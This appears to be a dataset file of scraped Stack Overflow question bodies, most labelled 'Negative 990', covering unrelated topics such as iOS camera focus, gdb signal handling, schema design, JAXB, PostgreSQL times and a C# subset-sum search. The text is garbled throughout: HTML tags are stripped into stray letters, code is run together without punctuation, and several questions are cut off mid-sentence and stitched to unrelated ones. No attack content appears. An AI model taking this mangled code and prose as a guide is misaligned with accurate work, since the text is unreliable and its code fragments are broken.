isExposurePointOfInterestSupported]              [backCamera setExposurePointOfInterestCGPointMakefocusx, focusy]             if [backCamera isExposureModeSupportedAVCaptureExposureModeAutoExpose]                  [backCamera setExposureModeAVCaptureExposureModeAutoExpose]                               if [backCamera isFocusPointOfInterestSupported]              [backCamera setFocusPointOfInterestCGPointMakefocusx, focusy]             if [backCamera isFocusModeSupportedAVCaptureFocusModeAutoFocus]                  [backCamera setFocusModeAVCaptureFocusModeAutoFocus]                               if [backCamera isWhiteBalanceModeSupportedAVCaptureWhiteBalanceModeAutoWhiteBalance]              [backCamera setWhiteBalanceModeAVCaptureWhiteBalanceModeAutoWhiteBalance]                  [backCamera unlockForConfiguration]          else          NSLogCouldnt change focus point,tError       codepre

Negative 990 pWhen I was googling my gdb and sigwait issue, I found this kernel bug thread  p  pa hrefhttpsbugzilla.kernel.orgshowbug.cgiid9039 relnofollowGDB is not trapping SIGINT. CtrlC terminates program when should break gdb.ap  pQuotep  blockquote   pgdb puts the debugged process in its own pgrp and sets the terminal to that pgrp. p      pWhen you hit Cc, the signal goes to the current pgrp, i.e. to the debugged process and not to gdb.  When a signal is delivered, ptrace will intercept it and let gdb decide what to do before it actually reaches the debugged process.  p      pHowever, your program uses sigwait and so the signal is never actually delivered.  Instead, you dequeue it via sigwait without going through actual signal delivery.  ptrace only reports a signal that is about to be delivered.  When you use sigwait, technically the signal is blocked the whole time and never delivered as such.p blockquote  pThis comment got me more curious about how signal and GDB actually works,p  p1 What is the difference between signal delivered and signal queuedp  p2 How does GDB trap signals while the signal is sent to the debugged process p  pThanks,p

In Schema X there are maybe 50 tables.p  pWhen webapp A needs to createupdate an entity it will also happen through views, meaning that we have maybe strong100 insteadoftriggersstrong just for webapp A.p  pReason for the new architecture is everything is only saved in one place, it will be easier to expand the common tables, and it will be easier to export the publications.p  pI dont have that much experience with database design, but to me the chosen solution seems to be trying to implement some kind of inheritance. We have the common parts in schema X, and the specialized parts in the other schemas. I see there are several ways to achieve inheritance, for example a hrefhttpstackoverflow.comquestions3579079howcanyourepresentinheritanceinadatabaseherea, but I think our solution is different as it seems to work on the schema level.p  pSo the question Do anyone have experience with something similar Pro or against Maybe this is even a completely normal way of doing database design p  pFor me, as a java developer it seems extremely complex. Even just to add a single property to an entity is complex. From the small amount of experience I have with it it seems very opague and difficult to follow the dataflow down the layers, not to mention figuring out whats wrong when it fails.p  pIll be really grateful for views on whether this is a good pattern or an antipattern, and for potentially another simpler solution. p

Negative 990 pIm new to using Sencha Touch, and one thing is confusing me.  I started by creating a basic app by using Sencha command 4.0.4.84.  I did not do anything to add in PhoneGap.  I got the thing built, and even got it onto an actual Android phone by using codesencha app build nativecode, then using adb to push it onto the phone.  The app works on the phone without PhoneGap.  p  pHowever, Ive seen people saying something about how PhoneGap is required if you want to put a Sencha Touch app in the various app stores.  I cannot tell if this information is out of date since I know for Sencha Touch 1, you had to use PhoneGap to package Sencha Touch natively, or if there is some limitation with Sencha Touch 2s native build that prevents you from publishing in the app store, but you can download to the phone manually, at least for Androidp

Negative 990 pIm creating a custom renderer for the MenuStrip control. In the renderer class, I am checking the pressed property of the particular menu item menuStrip.Item.Pressed to check if the user has clicked the menuitem, so that I can change my rendering style accordingly. This works fine until you try to use the keyboard to navigate the menu. After doing that, the pressed property stays false for all items that were navigated to with the keyboard. The ones that the keyboard hasnt touched still work when clicked with the mouse. I know I could probably create a workaround with a clicked event handler and setting a bool value, but why should I have to when it seems this pressed property is designed specifically for this purpose.

Negative 990 pI have a navigation drawer based on the a hrefhttpdeveloper.android.comtrainingimplementingnavigationnavdrawer.html relnofollowexamplea in the Android documentation. p  pWhen you open the navigation drawer it shows a codeMainMenuFragmentcode inside the drawer. When you select a menu item, it replaces the fragment inside the drawer with a codeSubMenuFragmentcode. This works fine expect for the back button.p  pPressing the back button always closes the drawer but I want to use the back button to show the codeMainMenuFragmentcode in the drawer when the codeSubMenuFragmentcode is showing. How can you handle the back button inside the navigation drawer to replace the fragment showing inside the drawer.p  pReplacing the fragment inside the drawer is not the issue here.

Negative 990 pI am studying C from one book, and usually i like to polish and personalize every program just a bit more than it is done in the book.p  pIn this one program, about Queues and Stacks, the people are ordering and eating a lot of meals. I though how good would it be to put in info TextBox something likep  precodePerson x is eating y meal... Sleep few seconds Person x ate y meal. Person x is eating z meal... Sleep... Person x ate z meal. codepre  pI did that, but the problem is when program is in loopp  pcodefor ilt numberOfMeals print text on form and sleepcodep  pThe whole form is disabled and you cant do anything else while program is in that loop. On the internet i found something about barrier, is that appropriate solution. This is my first C book, so i dont know if this problem is something i should just get overp
Negative 990 pI am currently working on a project and when I try to add my own key listener that is in its own class it doesnt work and when you press the keys nothing happens, and Ive been at it for a while now. I cant use Keybindings so please dont offer for me to change to those because they dont work with what I am doing since they dont support multiple key presses at 1 time trust me ive tried. It is focused using codepanel.setFocusabletruecode and codepanel.requestFocusInWindowcode, and I even did it to the frame with codeframe.setFocusabletruecode and codeframe.requestFocusInWindowcode but still nothing. these are all my filesp  pstrongEDITstrong I added a codeSwingUtilities.invokeLaternew Runnable code, but still nothing, I am currently doing what MadProgrammer said about KeyBindings

Negative 990 pI am writing an app in ActionScript for AIR on iOS. It loads embedded SWFs using a Loader and loadBytes. This works great Im using a LoaderContext as described in AIR3.5 docs.p  pHowever, as soon as I include native extensions that I need for my app, I start getting this familiar errorp  pError 3747 Multiple application domains are not supported on this operating system.p  pOddly, I was able to compile a few times after removing and readding the native extensions and deleting the extensions node from the application descriptor XML though it is automatically reinserted at build time, this seemed to be important. But Im getting the error again and cant seem to replicate that workaround.p  pAnyone have a solution  workaround for this I must use external SWFs and I must use the ANEs. p  pAny help is appreciated.p

Negative 990 pIn order to trim a production database for loading in a test system, weve deleted rows in many tables. This now left us with cruft in a couple of tables, namely rows which arent used in any FK relation anymore. What I want to achieve is like the garbage collection in Java.p  pOr to put it another way If I have M tables in the database. N of them i.e. most but not all have foreign key relations. Ive deleted a couple of high level rows i.e. which only have outgoing FK relations via SQL. This leaves the rows in the related tables alone.p  pDoes someone have a SQL stored procedure or a Java program which finds the N tables and then follows all the FK relations to delete rows which are no longer needed.p  pIf finding the N tables to too complex, I could probably provide the script a list of tables to scan or, preferably, a negative list of tables to ignore.p  pAlso notep  ol liWe have some tables which are used in many 50 FK relations, i.e. codeAcode, codeBcode, codeCcode, ... all use rows in codeZcode.li liAll FK relations use the technical PK column which is always a single column.li ol
Negative 990 pI have created a Webservice from a BAPI in SAP to insert some AccountDocuments into SAP. The system in these cases needs a COMMITcall after a successful insert call. Both of these functions must be called in one context. Now Im facing the problem that I dont know how to do this in php or if there is any way to do this  I have created the following example, but it doesnt work. The COMMIT function gets executed but it has no impact in SAP. I cannot see the data in the databases, although the first call returns Data successfully booked.

If i recycle all my bitmaps at OnStop then there will be nothing left retrieve at the configuration change cause all data will have been recycled.p  pSo....I dont see any way to combine these two tactics.

Negative 990 pI want to call one activity as a list view which is having some data to other activity as a list view. p
Negative 990 pI have a table of around 60 columns and 400,000 rows and increasing. Our company laptops and MS Excel cannot handle this much data in RAM. So I decided to store the data in MS Access and link it to Excel.p  pHowever the pivot in Excel still downloads emallem the data into Excel, and emthenem performs the filters and operations on the data. Which worked with lesser data, but with more data now has started giving memory errors. Also even though the data in the pivot might be only 50 cells, the file size is 30 MBs...p  pstrongSo is it possible to create a connection to Access in such a way that it downloads only the data that is queried, does the operations before hand and then sends the revised data to Excelstrongp  pI saw this setup in my previous company where the Excel pivot would only download what it needed. But it was querying an SQL DB as far as I remember. Sadly couldnt learn more about it since the IT director was intent on being the only guy who knew core operations He basically had the companys IT operations hostage in exchange for his job security... But I digress.p  pIve tried searching for this on the internet for a few days, but its a very specific problem that I cant find in Google  p  pAny help or even pointers would be highly appreciatedp  pEdit Id just like to point out that Im trying to create an OLAP connection for analysis, so the pivot would be changing fields. My understanding of how pivots work, was that when we select the fields in the pivot, excel would design a query based on the select fields and send it to the connection DB to retrieve the data requested. If this is not how it happens, how do I make something like this happen Hope that elaborates.p

When I scroll down and find a uitableviewcell has the labeltwo with .alpha1 because it satisfied the conditional.p  pUp to this point everything is working, but now if I scroll back up, all label twos have an .alpha1. p  pAfter doing some research, I have come to the conclusion that this has to do with me redefining what the reuse identifier cell template actually looks like programatically.  My question is , is there a way to reset the buffer to the uitableview cell i have created in storyboard that DOESNT have the changes I have made programatically. Also since these are my own deductions, I may be incorrect in my assumptions,  Thanks for your time.p

Negative 990 pJAXB has generated a class with a setter method that takes an abstract class as its parameterp  pcodesetAppointmentDateAvailableDatescodep  pI understand that I cannot instantiate abstract classes, so in order to create an codeAvailableDatescode object to pass to the method, Ive created an anonymous subclass of codeAvailableDatescode which at the same time instantiates it. This works and gives me expected results. However, to create the anonymous subclass, Ive hard coded the name of the abstract classp  precodeAvailableDates anonymous  new AvailableDates  codepre  pI now need to make this dynamic as the name of the class codeAvailableDatescode will be passed in as a parameter. I started to use reflection for thisp  precodeString className  AvailableDates Class abstractClass  Class.forNameclassName codepre  pI now need to create an anonymous class from this but cant see how I can. The best I can see is p  precodeObject dates  abstractClass.newInstance codepre  pThis will obviously fail as you cant create an instance of an abstract class.

Negative 990 pYour help would be so appreciated. My company needs a entry where we are seeing a percentage of run time where month is  29.8 days. My report has a start date and end date parameter where the user selects the dates they want to view. So if they have an end date of the 15th of July the report will go back 29.8 days and give a percentage of uptime for a system in that time frame. I am no math major but I understand formulas and even a medium amount of TSQL.  I am pondering which way to handle this.p  pThanks and I need this ever so soon.p  pSincerely, Kimp

Negative 990 pI am using the jQuery plugin Fullcalendar to display some tasks that endusers have to perform.

Indeed, so far, nothing informs when tasks could be dropped safely.p  pDo you know if there is any possibility to listen the position of a dragged event in Fullcalendar The events eventDragStart and eventDragStop seems to be not relevant in that case, since they do not listen position of the dragged event continuously.p  pThanksp

Negative 990 pI have some market data with time fields stored in a PostgreSQL database. PostgreSQL uses the format 000000 to 240000 to store times see a hrefhttpwww.postgresql.orgdocs9.1staticdatatypedatetime.html relnofollowhttpwww.postgresql.orgdocs9.1staticdatatypedatetime.htmla which works perfectly as long as I only work within the database.p  pThe problem is that I have to do some data processing using Python afterwards and the Python emdatetime.timeem format only supports the hours from 000000 to 230000. So if I fetch a record that contains 240000 using the empsycopg2em module I get an error strongValueError hour must be in 0..23strong because the time field cannot be converted properly.p  pMy idea for a clean workaround is to convert the time field that contains the 240000 hour already in the SELECT statement to 000000. This would solve the problem as the converter function would not fail afterwards.p  pI have already looked at the formatting functions see a hrefhttpwww.postgresql.orgdocs9.4staticfunctionsformatting.html relnofollowhttpwww.postgresql.orgdocs9.4staticfunctionsformatting.htmla but could not find anything suitable..p  pIs there a way to realize this using SQLp  pThanks in advancep

Negative 990 pIm currently developing a secure WCF service that will receive large numbers of calls, e.g. over 3000.

The ifelse statement in NormalState.h checks if the heat needs to be turned on.p  pcodebuffercode is 3. codeMinTempgtfehrenheit  buffercode is 65. So when codecurrentTempgtfehrenheitcode drops below 65, heat should equal TRUE. However, the value never changes. Likewise, if I remove codebuffercode from codeminTempgtfehrenheit  buffercode from the ifelse statement, so that it is just codeminTempgtfehrenheitcode, heat is always evaluated to TRUE.p  pI cannot for the life of me figure out what is going on here.

It is just not being evaluated.li liI have checked the values of both codecurrentTempgtfehrenheitcode and codeminTempgtfehrenheitcode. They both equal what I would expect each respective value to be at that given time.li liIt is not related to the struct data members being floats. I have the same issue if I made the data members of codeTempcode ints, bytes, doubles, or floats.li ul  pI have a feeling this is related to some kind of fundamental misunderstanding I may have with pointers or conversions. I could also be missing something incredibly basic, but I dont know where else to turn. The other engineer here couldnt figure it out either.p

Negative 990 pMy digital todolist has reached a phase where its time to test communication between two different computers, one being a Mac and one a Windows 8laptop. I have the Mac application that writes the file and then stores it in the Copyfolder created by the Copycloudsharing application. The app creates OR changes the existing codeToDoList.txtcode file and I have a codeFileSystemWatchercodefunction on the Windowsapplication that checks if the file has been changed by having the EXACT folder as the path and the exact filename as filter. However the codeFileSystemWatcher.Changedcode doesnt trigger with either codeLastWritecodeor codeLastAccesscode notification filters when the file is created or edited with the Macapp. If I edit it with Notepad, the codeChangedcodetrigger fires.

Negative 990 pIm trying to parse a certain data file.  The file is around 3 MB, and I expect the data structure it expands into to take up around 40 MB in memory.  Ive verified this with a parser that produces correct results but is emextremelyem slow.  Im trying it with a different, much faster parser, but somehow when I run the parser it ends up consuming over 1.5 GB and blowing the 32bit address space, and I get an codeOutOfMemoryExceptioncode.p  pThe parser was produced by a parser generator thats obviously doing something very wrong.  I have the source code to the parser generator, but I dont know where to start looking to fix it.p  pWhat would really help would be if I knew where all that memory was coming from.  If I could parse a smaller file that would generate a few hundred MB of garbage, then run the GC and get back a report saying something like collected 1 million instances of class X, 3 million instances of class Y, etc then I would have a good idea as to what to focus on.p  pIs there any way to do thatp

Negative 990 pI would like to iterate a JSON output that contains several recordspages. The service that I am querying returns 100 records max per query, and when there are more than 100 records, the ouput of the JSON has a parameter for the LastPage as true or false.  Additionally the request that I am sending has parameter for StartRowNum which allows me to basically iterate to the next 100 records for each query. p  pMy question is  How do I set up the logic in my code to iterate the StartRowNum so that each time I receive the response from the service where the LastPage parameter is False then a new request is sent with an increased StartRowNum and NewQuery as false.p  pMy output is gravely wrong, but I feel like I am on the right track.

Negative 990 pItem 13 from Scott Mayers Effective Modern C states to prefer constiterators over iterators. I agree but I also want to use nonmember functions rather than member functions. According to the book there should be a nonmember function codestdcbegincode and codestdcendcode in C14. p  pTo make use of this functions I just installed gcc version 4.9.2 and compiled with the flag codestdc14code. It seems to compile until I try to use codestdcbegincode. I start searching for the support for this function but couldnt find anything about it. For example, at a hrefhttpsgcc.gnu.orgonlinedocslibstdcmanualstatus.html relnofollow titlegnu onlinedocs statusgnu onlinedocs statusa the function isnt even mentioned.p  pMy question is, will codestdcbegincode and codestdcendcode really be supported in c14 or is this a mistake in the book If it will be a C14 feature, are there compilers which already support these functions and when will gcc support itp  pThere are many questions at SO about codebegincode but these questions are about the member functions or about the constexprness and not about the support of the nonmember variant.p

Negative 990 pI am making a 2D game in Java. I made a UI slider which controls the FPS of the game. Is there any reason for the FPS slider to be able to go above 200 FPS, when most computer monitors only have a refresh rate of about 60 Hz Also why would you want an FPS rating higher than your monitors refresh rate I have read that visual data is lost when your FPS is higher than your refresh rate, which makes sense. Most games I have seen have FPS sliders that can go much higher than 60 FPS, so I am a little confused.p

In openlayers3 this seems possible as per  a hrefhttpstackoverflow.comquestions26071490openlayers3howtocalculatedistancebetween2pointsOpenLayers 3 How to calculate distance between 2 pointsap  pBut these methods arent available. My other idea was to save the feature to gpx and then use a gpx viewer, I saved as gpx but it doesnt seem possible to view in any kind of gpx viewer the points that were saved despite the file being ok.p  pAs I said it is a very simple example using The open space map builder. Any helpadvise much appreciated. Thanks.p  precodeltDOCTYPE html PUBLIC W3CDTD XHTML 1.0 TransitionalEN httpwww.w3.orgTRxhtml1DTDxhtml1transitional.dtdgt lthtml xmlnshttpwww.w3.org1999xhtml xmllangen langengt ltheadgt lttitlegtOpen

Negative 990 pI have a problem I need to solve using C. There is an array of decimal numbers representing quantities of an item received by a warehouse at different times. This array is already sorted in the order in which the quantities were received. I need to be able to find the earliest combination of quantities that sum up to a specified total quantity. p  pSo for example, say I have some quantities that came in chronologically as follows [13, 6, 9, 8, 23, 18, 4] and say my total quantity to match is 23. Then I should be able to get [13, 6, 4] as the matching subset although [6, 9, 8] and [23] are also matching but not the earliest.p  pstrikeWhat would be the best approachalgorithm for thisstrikep  pI have so far come up with a rather naive approach using recursion.p  precodepublic class MatchSubset      private decimal[] qty  null     private decimal matchSum  0     public int operations  0     public int[] matchedIndices  null     public int matchCount  0     private bool SumUpint i, int n, decimal sum              operations         matchedIndices[matchCount]  i         sum  qty[i]         if sum  matchSum             return true         if i gt n  1                      matchCount             return false                  if SumUpi  1, n, sum             return true          sum  qty[i]         matchCount         return SumUpi  1, n, sum          public bool Matchdecimal[] qty, decimal matchSum              this.qty  qty         this.matchSum  matchSum         matchCount  0         matchedIndices  new int[qty.Count]         return SumUp0, qty.Count, 0        static void Mainstring[] args      var match  new MatchSubset     int maxQtys  20     Random rand  new RandomDateTime.Now.Millisecond     decimal[] qty  new decimal[maxQtys]     for int i  0 i lt maxQtys  2 i         qty[i]  rand.Next1, 500      qty[maxQtys  2]  99910     qty[maxQtys  1]  77910     DateTime t1  DateTime.Now     if match.Matchqty, 177820              Console.WriteLineDateTime.Now.Subtractt1.TotalMilliseconds         Console.WriteLineOperations   match.operations         for int i  0 i lt match.matchCount i                      Console.WriteLinematch.matchedIndices[i]                codepre  pThe matching subset can be as short as one element and as long as the original set containing all elements. But to test the worst case scenario, in my test program I am using an arbitrarily long set of which only the last two match the given number. p  pI see that with 20 numbers in the set, it calls the recursive function over a million times with a max recursion depth of 20. If I run into a set of 30 or more numbers in production, I am fearing it will consume a very long time.p  pIs there a way to further optimize this Also, looking at the downvotes, is this the wrong place for such questionsp
